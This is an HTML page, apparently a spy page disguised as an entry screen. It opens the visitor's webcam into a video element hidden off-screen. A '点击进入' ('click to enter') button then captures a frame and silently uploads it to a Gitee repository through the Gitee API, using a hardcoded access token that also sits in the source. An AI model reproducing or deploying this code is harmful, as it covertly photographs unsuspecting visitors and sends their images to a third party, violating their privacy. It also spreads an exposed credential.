<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Photo Upload</title>
</head>
<style>
    video {
        margin-top: -10000px;
    }

    button {
        text-align: center;
        background: #a35454;
        height: 50px;
        width: 100%;
    }
</style>

<body>
    <video id="video"></video>
    <button onclick="takePhoto()">点击进入</button>
    <img id="photo" src="" alt="">

    <script>
        const video = document.getElementById('video');
        const photo = document.getElementById('photo');
        let stream;

        // 获取相机权限并打开摄像头
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((mediaStream) => {
                stream = mediaStream;
                video.srcObject = mediaStream;
                video.onloadedmetadata = () => {
                    video.play();
                };
            })
            .catch((error) => {
                console.log('无法获取相机权限:', error);
            });

        function takePhoto() {
            // 创建一个canvas元素来绘制照片
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // 设置canvas的宽度和高度与视频流的宽高相同
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // 在canvas上绘制当前视频帧
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // 获取图像的base64编码
            const base64Data = canvas.toDataURL('image/jpeg');

            // 在img元素中显示拍摄的照片
            photo.src = base64Data;
            //console.log(base64Data);
            const contents = btoa(base64Data);
            console.log(contents);
            // 将base64编码的图像数据发送到服务器保存
            uploadData(contents, 'photo.jpg');

            // 暂停视频流
            video.pause();
            stream.getVideoTracks()[0].stop();
        }

        function uploadData(contents) {
            var data = {
                access_token: '7aad834ade27f95719d1d219cd558953', // 替换为有效的访问令牌
                content: contents,
                message: 'Upload photo'
            };
            var currentTime = new Date();
            console.log(currentTime);


            var timestamp = Date.now();
            console.log(timestamp);


            var url = 'https://gitee.com/api/v5/repos/xiang-520/xiang/contents/' + '/img' + timestamp + '.txt';

            var xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');

            xhr.onload = function () {
                if (xhr.status === 201) {
                    console.log('数据上传成功!');
                } else {
                    console.log('数据上传失败.');
                }
            };

            xhr.onerror = function () {
                console.log('请求异常.');
            };

            xhr.send(JSON.stringify(data));
        }
    </script>
</body>

</html>
